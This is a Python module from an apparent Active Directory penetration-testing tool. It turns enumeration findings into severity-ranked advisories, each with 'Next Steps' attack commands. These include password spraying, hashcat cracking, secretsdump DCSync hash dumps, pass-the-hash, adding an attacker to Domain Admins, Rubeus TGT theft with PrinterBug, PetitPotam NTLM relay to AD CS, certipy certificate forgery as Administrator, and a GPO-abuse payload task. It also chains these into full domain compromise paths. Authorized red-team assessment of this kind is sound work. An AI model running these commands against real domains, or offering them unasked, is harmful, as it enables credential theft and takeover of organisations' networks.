from __future__ import annotations

from collections import Counter
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

from utils.output import print_section, register_result, _report_data

console = Console()


SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
SEVERITY_COLOUR = {
    "critical": "bright_red",
    "high":     "red",
    "medium":   "yellow",
    "low":      "bright_blue",
    "info":     "white",
}


@dataclass
class Advisory:
    id:         str
    severity:   str
    title:      str
    evidence:   List[str]    = field(default_factory=list)
    commands:   List[str]    = field(default_factory=list)
    references: List[str]    = field(default_factory=list)

    def sort_key(self) -> int:
        return SEVERITY_ORDER.get(self.severity.lower(), 99)


_RULES: List[Callable[[Dict[str, Any]], List[Advisory]]] = []


def _rule(fn: Callable) -> Callable:
    """Decorator to register a rule function."""
    _RULES.append(fn)
    return fn


def _domain(data: dict) -> dict:
    return data.get("Domain Information", {})

def _users(data: dict) -> dict:
    return data.get("Users & Groups", {})

def _kerb(data: dict) -> dict:
    return data.get("Kerberoasting & AS-REP Roasting", {})

def _acl(data: dict) -> dict:
    return data.get("ACL Analysis", {})

def _adcs(data: dict) -> dict:
    return data.get("AD Certificate Services", {})

def _computers(data: dict) -> dict:
    return data.get("Computers & Hosts", {})

def _smb(data: dict) -> dict:
    return data.get("SMB Shares", {})

def _gpo(data: dict) -> dict:
    return data.get("GPO Enumeration", {})


def _threshold_int(pp: dict) -> int:
    """Return lockout threshold as int (0 = disabled)."""
    try:
        return int(str(pp.get("Lockout Threshold", "0")).split()[0])
    except (ValueError, TypeError):
        return -1


@_rule
def rule_no_lockout(data: dict) -> List[Advisory]:
    pp = _domain(data).get("password_policy", {})
    if _threshold_int(pp) == 0:
        return [Advisory(
            id="ADV-001",
            severity="critical",
            title="Account lockout DISABLED — password spray unrestricted",
            evidence=["Lockout Threshold = 0 (domain password policy)"],
            commands=[
                "# No lockout risk — spray at will (use reasonable timing anyway)",
                "crackmapexec smb <DC_IP> -u users.txt -p 'Winter2024!' --continue-on-success",
                "kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt 'Winter2024!'",
            ],
            references=["T1110.003 — Password Spraying"],
        )]
    return []


@_rule
def rule_weak_min_length(data: dict) -> List[Advisory]:
    pp = _domain(data).get("password_policy", {})
    try:
        length = int(str(pp.get("Min Password Length", "7")).split()[0])
    except (ValueError, TypeError):
        return []
    if 0 < length < 12:
        return [Advisory(
            id="ADV-002",
            severity="medium",
            title=f"Weak minimum password length ({length} chars) — short passwords brute-forceable",
            evidence=[f"minPwdLength = {length} (recommended ≥ 12)"],
            commands=[
                "hashcat -m 1000 ntds.dit.hashes rockyou.txt --rules-file best64.rule",
                "hashcat -m 1000 ntds.dit.hashes -a 3 ?a?a?a?a?a?a?a?a",
            ],
            references=["CIS Benchmark: minimum 14 chars", "T1110.002"],
        )]
    return []


@_rule
def rule_cleartext_reversible(data: dict) -> List[Advisory]:
    pp = _domain(data).get("password_policy", {})
    if "YES" in str(pp.get("Store Cleartext", "")):
        return [Advisory(
            id="ADV-003",
            severity="critical",
            title="Reversible password encryption ENABLED — plaintext passwords readable from NTDS",
            evidence=["pwdProperties has DOMAIN_PASSWORD_STORE_CLEARTEXT set"],
            commands=[
                "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile hashes",
                "# Decode $HEX[...] entries:",
                "python3 -c \"print(bytes.fromhex('<hex>').decode())\"",
            ],
            references=["T1003.003 — NTDS", "MS-ADTS §3.1.1.3.1.5"],
        )]
    return []


@_rule
def rule_no_complexity(data: dict) -> List[Advisory]:
    pp = _domain(data).get("password_policy", {})
    complexity = str(pp.get("Password Complexity", "Enabled"))
    if "DISABLED" in complexity.upper() or complexity.strip() == "DISABLED":
        return [Advisory(
            id="ADV-004",
            severity="medium",
            title="Password complexity NOT enforced — dictionary attacks more effective",
            evidence=["pwdProperties: DOMAIN_PASSWORD_COMPLEX bit is not set"],
            commands=[
                "# Use common word lists without complexity mutations first:",
                "hashcat -m 1000 ntds.dit.hashes rockyou.txt",
                "crackmapexec smb <DC_IP> -u users.txt -p common_passwords.txt",
            ],
            references=["CIS Benchmark AD L1", "T1110.002"],
        )]
    return []


@_rule
def rule_kerberoastable(data: dict) -> List[Advisory]:
    accounts = _kerb(data).get("kerberoastable", []) or _users(data).get("kerberoastable", [])
    if not accounts:
        return []
    count = len(accounts)

    priv_sams = {u.get("sam", "").lower() for u in _users(data).get("privileged_users", [])}
    kerb_names = []
    for a in accounts:
        if isinstance(a, dict):
            kerb_names.append(a.get("account", a.get("sam", "")))
        else:
            kerb_names.append(str(a))
    privileged_overlap = [n for n in kerb_names if n.lower() in priv_sams]

    severity = "critical" if privileged_overlap else "high"
    evidence = [f"{count} kerberoastable service account(s) found"]
    if privileged_overlap:
        evidence.append(f"PRIVILEGED and kerberoastable: {', '.join(privileged_overlap)}")

    return [Advisory(
        id="ADV-010",
        severity=severity,
        title=f"{count} Kerberoastable account(s) — offline TGS hash cracking possible",
        evidence=evidence,
        commands=[
            "# Request TGS hashes (if not already captured):",
            "GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -outputfile kerberoast.txt",
            "# Crack — RC4=13100, AES128=19600, AES256=19700:",
            "hashcat -m 13100 kerberoast.txt rockyou.txt --rules-file best64.rule",
            "# Prioritise DA-overlapping accounts!",
        ],
        references=["T1558.003 — Kerberoasting"],
    )]


@_rule
def rule_asrep_roastable(data: dict) -> List[Advisory]:
    accounts = _kerb(data).get("asreproastable", []) or _users(data).get("asreproastable", [])
    if not accounts:
        return []
    return [Advisory(
        id="ADV-011",
        severity="high",
        title=f"{len(accounts)} AS-REP Roastable account(s) — hash capture WITHOUT credentials",
        evidence=[f"DONT_REQ_PREAUTH accounts: {', '.join(str(a) for a in accounts[:10])}"],
        commands=[
            "GetNPUsers.py <DOMAIN>/ -usersfile userlist.txt -dc-ip <DC_IP> -no-pass -format hashcat",
            "hashcat -m 18200 asrep_hashes.txt rockyou.txt --rules-file best64.rule",
        ],
        references=["T1558.004 — AS-REP Roasting"],
    )]


@_rule
def rule_dcsync(data: dict) -> List[Advisory]:
    principals = _acl(data).get("dcsync_principals", [])
    if not principals:
        return []
    return [Advisory(
        id="ADV-020",
        severity="critical",
        title=f"DCSync path — {len(principals)} non-admin principal(s) have replication rights",
        evidence=[f"SIDs with DS-Replication-Get-Changes-All: {', '.join(principals[:5])}"],
        commands=[
            "# Dump ALL domain hashes without touching LSASS:",
            "secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC_IP>",
            "secretsdump.py -hashes :<NTHASH> <DOMAIN>/<USER>@<DC_IP>",
            "# Pass-the-Hash as any domain admin or crack offline:",
            "crackmapexec smb <DC_IP> -u Administrator -H <NT_HASH>",
        ],
        references=["T1003.006 — DCSync", "mimikatz lsadump::dcsync"],
    )]


@_rule
def rule_genericall(data: dict) -> List[Advisory]:
    aces = _acl(data).get("dangerous_aces", [])
    ga = [a for a in aces if "GenericAll" in a.get("right", "")]
    if not ga:
        return []
    targets = list({a["object"].split(",")[0].replace("CN=", "") for a in ga})[:5]
    return [Advisory(
        id="ADV-021",
        severity="high",
        title=f"GenericAll ACE(s) on {len(ga)} high-value object(s) — full object control",
        evidence=[f"Objects: {', '.join(targets)}"],
        commands=[
            "# Force-reset target password:",
            "net rpc password <TARGET> <NEW_PASS> -U <DOMAIN>/<ATTACKER>%<PASS> -S <DC_IP>",
            "# Or via PowerView:",
            "Set-DomainUserPassword -Identity <TARGET> -AccountPassword (ConvertTo-SecureString 'P@ss!' -AsPlainText -Force)",
            "Add-DomainGroupMember -Identity 'Domain Admins' -Members <ATTACKER>",
        ],
        references=["T1484 — Domain Policy Modification", "BloodHound — GenericAll edge"],
    )]


@_rule
def rule_writedacl(data: dict) -> List[Advisory]:
    aces = _acl(data).get("dangerous_aces", [])
    wdacl = [a for a in aces if "WriteDACL" in a.get("right", "") or "WriteOwner" in a.get("right", "")]
    if not wdacl:
        return []
    trustees = list({a["trustee"] for a in wdacl})
    return [Advisory(
        id="ADV-022",
        severity="high",
        title=f"WriteDACL / WriteOwner on {len(wdacl)} privileged object(s) — self-grant GenericAll",
        evidence=[f"Trustees: {', '.join(trustees[:5])}"],
        commands=[
            "$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\\<USER>',",
            "        (ConvertTo-SecureString '<PASS>' -AsPlainText -Force))",
            "Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity <ATTACKER> -Rights All -Credential $Cred",
        ],
        references=["T1222 — File Permissions Modification", "BloodHound — WriteDACL edge"],
    )]


@_rule
def rule_unconstrained_delegation(data: dict) -> List[Advisory]:
    interesting = _users(data).get("interesting_accounts", [])
    ud_users = []
    for item in interesting:
        if isinstance(item, (list, tuple)) and len(item) >= 2:
            acc, flags = item[0], item[1]
            if isinstance(flags, list) and any("Unconstrained" in f for f in flags):
                ud_users.append(acc)
        elif isinstance(item, dict):
            if any("Unconstrained" in str(f) for f in item.get("uac_flags", [])):
                ud_users.append(item.get("sam", ""))

    ud_comps = []
    for c in _computers(data).get("delegation", []):
        label = c.get("name", str(c)) if isinstance(c, dict) else str(c)
        if "unconstrained" in str(c).lower():
            ud_comps.append(label)

    all_targets = ud_users + ud_comps
    if not all_targets:
        return []

    return [Advisory(
        id="ADV-030",
        severity="critical",
        title=f"Unconstrained Kerberos delegation on {len(all_targets)} object(s) — TGT theft vector",
        evidence=[f"Accounts/hosts: {', '.join(str(t) for t in all_targets[:8])}"],
        commands=[
            "# Monitor for TGTs arriving at the compromised host:",
            "Rubeus.exe monitor /interval:5 /nowrap",
            "# Trigger DC to authenticate via PrinterBug / PetitPotam:",
            "printerbug.py <DOMAIN>/<USER>:<PASS>@<DC_IP> <COMPROMISED_HOST>",
            "# Import captured TGT and DCSync or move laterally:",
            "Rubeus.exe ptt /ticket:<base64>",
        ],
        references=["T1558 — Steal or Forge Kerberos Tickets", "T1187 — Forced Authentication"],
    )]


@_rule
def rule_constrained_delegation(data: dict) -> List[Advisory]:
    interesting = _users(data).get("interesting_accounts", [])
    cd_accounts = []
    for item in interesting:
        if isinstance(item, (list, tuple)) and len(item) >= 2:
            acc, flags = item[0], item[1]
            if isinstance(flags, list) and any("Constrained delegation" in f for f in flags):
                cd_accounts.append(acc)
        elif isinstance(item, dict):
            if any("Constrained delegation" in str(f) for f in item.get("uac_flags", [])):
                cd_accounts.append(item.get("sam", ""))
    if not cd_accounts:
        return []
    return [Advisory(
        id="ADV-031",
        severity="high",
        title=f"Constrained delegation (S4U2Proxy) on {len(cd_accounts)} account(s)",
        evidence=[f"Accounts: {', '.join(cd_accounts[:8])}"],
        commands=[
            "# After compromising the service account, impersonate any user to the allowed SPN:",
            "getST.py -spn <TARGET_SPN> -impersonate Administrator <DOMAIN>/<SVC_ACCT>:<PASS>",
            "export KRB5CCNAME=Administrator.ccache",
            "wmiexec.py -k -no-pass <DOMAIN>/Administrator@<TARGET_HOST>",
        ],
        references=["T1558 — Kerberos Tickets", "Elad Shamir — Wagging the Dog"],
    )]


@_rule
def rule_adcs_esc1(data: dict) -> List[Advisory]:
    esc1 = _adcs(data).get("ESC1", [])
    if not esc1:
        return []
    templates = [t.get("template", str(t)) if isinstance(t, dict) else str(t) for t in esc1]
    return [Advisory(
        id="ADV-040",
        severity="critical",
        title=f"AD CS ESC1 — {len(esc1)} template(s): SAN + Client Auth + low-priv enroll",
        evidence=[f"Vulnerable templates: {', '.join(templates[:5])}"],
        commands=[
            "# Enroll as any user while specifying arbitrary UPN (e.g. Administrator):",
            "certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -ca <CA_NAME> -template <TEMPLATE> -upn administrator@<DOMAIN>",
            "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
        ],
        references=["ESC1 — SpecterOps Certified Pre-Owned", "T1649"],
    )]


@_rule
def rule_adcs_esc6(data: dict) -> List[Advisory]:
    esc6 = _adcs(data).get("ESC6", [])
    if not esc6:
        return []
    return [Advisory(
        id="ADV-041",
        severity="critical",
        title="AD CS ESC6 — CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 set (arbitrary SAN on any cert)",
        evidence=[f"CA(s): {', '.join(str(e) for e in esc6[:3])}"],
        commands=[
            "certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -ca <CA_NAME> -template User -upn administrator@<DOMAIN>",
            "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
        ],
        references=["ESC6 — Certified Pre-Owned", "T1649"],
    )]


@_rule
def rule_adcs_esc8(data: dict) -> List[Advisory]:
    esc8 = _adcs(data).get("ESC8", [])
    if not esc8:
        return []
    return [Advisory(
        id="ADV-042",
        severity="high",
        title="AD CS ESC8 — HTTP Web Enrollment exposed (NTLM relay to CA)",
        evidence=[f"Enrollment URL(s): {', '.join(str(e) for e in esc8[:3])}"],
        commands=[
            "# Relay NTLM auth from DC to CA Web Enrollment:",
            "ntlmrelayx.py -t http://<CA_HOST>/certsrv/certfnsh.asp --adcs --template DomainController",
            "petitpotam.py -u '' -p '' <RELAY_HOST> <DC_IP>",
            "certipy auth -pfx dc.pfx -dc-ip <DC_IP>",
        ],
        references=["ESC8 — Certified Pre-Owned", "T1557 — Adversary-in-the-Middle"],
    )]


@_rule
def rule_writable_shares(data: dict) -> List[Advisory]:
    shares = _smb(data).get("shares", [])
    writable = [s for s in shares
                if s.get("writable") or "write" in str(s.get("access", "")).lower()]
    if not writable:
        return []
    return [Advisory(
        id="ADV-050",
        severity="high",
        title=f"Writable SMB shares on {len({s.get('host','') for s in writable})} host(s) — file-drop / hash-relay",
        evidence=[f"{s.get('name','?')}@{s.get('host','?')}" for s in writable[:6]],
        commands=[
            "# Drop an SCF/LNK to capture incoming NTLM hashes:",
            "responder -I <INTERFACE> -wd",
            "smbclient //<HOST>/<SHARE> -U <USER>%<PASS> -c 'put payload.scf'",
            "# Or relay directly:",
            "ntlmrelayx.py -smb2support -t smb://<TARGET>",
        ],
        references=["T1557.001 — LLMNR/NBT-NS Poisoning", "T1187 — Forced Authentication"],
    )]


@_rule
def rule_interesting_files(data: dict) -> List[Advisory]:
    files = _smb(data).get("interesting_files", [])
    if not files:
        return []
    names = [f.get("filename", str(f)) if isinstance(f, dict) else str(f) for f in files[:10]]
    return [Advisory(
        id="ADV-051",
        severity="high",
        title=f"Sensitive files found on SMB shares ({len(files)} total)",
        evidence=names,
        commands=[
            "smbclient //<HOST>/<SHARE> -U <USER>%<PASS> -c 'get <FILENAME>'",
            "grep -riE 'pass(word)?\\s*[:=]|pwd\\s*[:=]|secret\\s*[:=]' <DOWNLOADED_FILES>",
        ],
        references=["T1552.001 — Credentials in Files"],
    )]


@_rule
def rule_laps_readable(data: dict) -> List[Advisory]:
    laps = _computers(data).get("laps_readable", [])
    if not laps:
        return []
    return [Advisory(
        id="ADV-052",
        severity="high",
        title=f"LAPS password readable on {len(laps)} computer(s) — local admin credentials exposed",
        evidence=[f"ms-Mcs-AdmPwd readable: {', '.join(str(h) for h in laps[:5])}"],
        commands=[
            "crackmapexec ldap <DC_IP> -u <USER> -p <PASS> --module laps",
            "Get-ADComputer <HOSTNAME> -Properties ms-Mcs-AdmPwd | Select Name,ms-Mcs-AdmPwd",
            "crackmapexec smb <HOST> -u Administrator -p '<LAPS_PWD>'",
        ],
        references=["T1552 — Unsecured Credentials"],
    )]


@_rule
def rule_transitive_trust(data: dict) -> List[Advisory]:
    trusts = _domain(data).get("trusts", [])
    transitive = [t for t in trusts
                  if "NON_TRANSITIVE" not in t.get("attributes", [])
                  and t.get("direction") in ("Bidirectional", "Outbound")]
    if not transitive:
        return []
    domains = [t.get("name", "?") for t in transitive]
    return [Advisory(
        id="ADV-060",
        severity="medium",
        title=f"Transitive trust(s) to {len(transitive)} domain(s) — cross-domain lateral movement",
        evidence=[f"Trusted: {', '.join(domains)}"],
        commands=[
            "GetADUsers.py -all -dc-ip <TRUSTED_DC_IP> <TRUSTED_DOMAIN>/<USER>:<PASS>",
            "getST.py -spn krbtgt/<TRUSTED_DOMAIN> <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>",
            "# If you own krbtgt: golden ticket + SID history across trust",
        ],
        references=["T1482 — Domain Trust Discovery", "T1134.005 — SID-History Injection"],
    )]


@_rule
def rule_gpo_dangerous_acl(data: dict) -> List[Advisory]:
    dangerous = _gpo(data).get("dangerous_gpo_acls", [])
    if not dangerous:
        return []
    return [Advisory(
        id="ADV-070",
        severity="high",
        title=f"{len(dangerous)} GPO(s) with dangerous ACLs — GPO hijack for domain-wide code execution",
        evidence=[str(g) for g in dangerous[:5]],
        commands=[
            "# SharpGPOAbuse — add a scheduled task via the writeable GPO:",
            "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author 'NT AUTHORITY\\SYSTEM'",
            "                  --Command cmd.exe --Arguments '/c <PAYLOAD>' --GPOName '<GPO_NAME>'",
            "gpupdate /force",
        ],
        references=["T1484.001 — Group Policy Modification"],
    )]


@_rule
def rule_stale_computers(data: dict) -> List[Advisory]:
    stale = _computers(data).get("stale_computers", [])
    if not stale:
        return []
    return [Advisory(
        id="ADV-091",
        severity="low",
        title=f"{len(stale)} stale computer account(s) — unmanaged endpoints may lack patching",
        evidence=[str(c) for c in stale[:5]],
        commands=[
            "crackmapexec smb <STALE_HOST_IP> -u '' -p '' --shares",
            "nmap -sV -p 445,3389,5985 <STALE_HOST_IP>",
        ],
        references=["T1078.002 — Valid Domain Accounts"],
    )]


@_rule
def rule_asrep_plus_no_lockout(data: dict) -> List[Advisory]:
    asrep = _kerb(data).get("asreproastable", []) or _users(data).get("asreproastable", [])
    pp = _domain(data).get("password_policy", {})
    if asrep and _threshold_int(pp) == 0:
        return [Advisory(
            id="ADV-080",
            severity="critical",
            title="CHAIN: AS-REP Roastable + no lockout = cracked creds sprayable with zero risk",
            evidence=[
                f"{len(asrep)} AS-REP roastable account(s)",
                "Lockout threshold = 0",
            ],
            commands=[
                "# Step 1 — capture hashes (no creds):",
                "GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass",
                "# Step 2 — crack:",
                "hashcat -m 18200 asrep.txt rockyou.txt",
                "# Step 3 — spray cracked password everywhere (no lockout):",
                "crackmapexec smb <CIDR> -u <USER> -p '<CRACKED>' --continue-on-success",
            ],
            references=["T1558.004", "T1110.003"],
        )]
    return []


@_rule
def rule_dcsync_plus_kerb_hashes(data: dict) -> List[Advisory]:
    dcsync = _acl(data).get("dcsync_principals", [])
    kerb_hashes = _kerb(data).get("hashes", [])
    if dcsync and kerb_hashes:
        return [Advisory(
            id="ADV-081",
            severity="critical",
            title="CHAIN: DCSync path + captured TGS hashes = clear route to full domain compromise",
            evidence=[
                f"DCSync-capable: {', '.join(dcsync[:3])}",
                f"{len(kerb_hashes)} TGS hash(es) already on disk",
            ],
            commands=[
                "# 1. Crack TGS hashes:",
                "hashcat -m 13100 kerberoast_hashes.txt rockyou.txt",
                "# 2. If cracked account has DCSync rights, dump all NTLM hashes:",
                "secretsdump.py <DOMAIN>/<CRACKED_USER>:<PASS>@<DC_IP>",
                "# 3. PtH as Domain Admin — domain owned.",
            ],
            references=["T1003.006", "T1558.003"],
        )]
    return []


@_rule
def rule_adcs_plus_no_lockout(data: dict) -> List[Advisory]:
    esc1 = _adcs(data).get("ESC1", [])
    esc6 = _adcs(data).get("ESC6", [])
    pp = _domain(data).get("password_policy", {})
    if (esc1 or esc6) and _threshold_int(pp) == 0:
        return [Advisory(
            id="ADV-082",
            severity="critical",
            title="CHAIN: Exploitable AD CS template + no lockout = frictionless DA certificate path",
            evidence=[
                f"ESC1 templates: {len(esc1)},  ESC6 CAs: {len(esc6)}",
                "Lockout threshold = 0",
            ],
            commands=[
                "# Spray to get any foothold, then abuse AD CS for DA cert:",
                "certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable",
                "certipy req -u <USER>@<DOMAIN> -p <PASS> -ca <CA> -template <TMPL> -upn administrator@<DOMAIN>",
                "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
            ],
            references=["ESC1/ESC6 — SpecterOps", "T1649", "T1110.003"],
        )]
    return []


def _collect_advisories(data: dict) -> List[Advisory]:
    advisories = []
    for rule_fn in _RULES:
        try:
            result = rule_fn(data)
            if result:
                advisories.extend(result)
        except Exception as exc:
            console.print(f"  [dim red]⚠ Rule {rule_fn.__name__} error: {exc}[/dim red]")
    advisories.sort(key=lambda a: a.sort_key())
    return advisories


def _render_advisory(adv: Advisory) -> None:
    colour = SEVERITY_COLOUR.get(adv.severity.lower(), "white")
    lines = []

    if adv.evidence:
        lines.append("[bold bright_cyan]Evidence[/bold bright_cyan]")
        for e in adv.evidence:
            lines.append(f"  [dim]•[/dim] {e}")

    if adv.commands:
        lines.append("")
        lines.append("[bold bright_cyan]Next Steps[/bold bright_cyan]")
        for cmd in adv.commands:
            if cmd.startswith("#"):
                lines.append(f"  [dim]{cmd}[/dim]")
            else:
                lines.append(f"  [bold bright_yellow]{cmd}[/bold bright_yellow]")

    if adv.references:
        lines.append("")
        lines.append("[bold bright_cyan]References[/bold bright_cyan]")
        for r in adv.references:
            lines.append(f"  [dim blue]{r}[/dim blue]")

    console.print(Panel(
        "\n".join(lines),
        title=f"  [dim]{adv.id}[/dim]  [bold {colour}][{adv.severity.upper()}][/bold {colour}]  {adv.title}  ",
        border_style=colour,
        expand=True,
        padding=(0, 1),
    ))


def _render_summary_table(advisories: List[Advisory]) -> None:
    tbl = Table(
        title="[bold bright_yellow]Advisory Summary[/bold bright_yellow]",
        box=box.ROUNDED,
        border_style="bright_blue",
        header_style="bold bright_cyan",
        show_lines=True,
    )
    tbl.add_column("ID",       style="dim",  width=10)
    tbl.add_column("Severity", width=10)
    tbl.add_column("Title",    overflow="fold")

    for adv in advisories:
        colour = SEVERITY_COLOUR.get(adv.severity.lower(), "white")
        tbl.add_row(
            adv.id,
            f"[bold {colour}]{adv.severity.upper()}[/bold {colour}]",
            adv.title,
        )
    console.print(tbl)


def run(conn=None) -> None:
    print_section("Advisories & Next-Step Recommendations")

    data = dict(_report_data)

    if not data:
        console.print(
            "  [yellow]⚠[/yellow]  No prior module results found.\\n"
            "         Run other modules first, then place 'advisories' last in -m."
        )
        return

    advisories = _collect_advisories(data)

    if not advisories:
        console.print(
            "  [bright_green]✔[/bright_green]  No advisories generated — "
            "environment appears reasonably hardened for the checks performed."
        )
        register_result("Advisories", {"total": 0, "advisories": []})
        return

    console.print()
    _render_summary_table(advisories)

    counts = Counter(a.severity.lower() for a in advisories)
    stat_parts = []
    for sev in ("critical", "high", "medium", "low", "info"):
        if counts[sev]:
            c = SEVERITY_COLOUR[sev]
            stat_parts.append(f"[bold {c}]{counts[sev]} {sev.upper()}[/bold {c}]")
    console.print()
    console.print("  " + "  •  ".join(stat_parts))

    console.print()
    console.rule("[bold bright_magenta]Detailed Advisories[/bold bright_magenta]")
    for adv in advisories:
        console.print()
        _render_advisory(adv)

    register_result("Advisories", {
        "total": len(advisories),
        "counts": dict(counts),
        "advisories": [
            {
                "id":         a.id,
                "severity":   a.severity,
                "title":      a.title,
                "evidence":   a.evidence,
                "commands":   a.commands,
                "references": a.references,
            }
            for a in advisories
        ],
    })
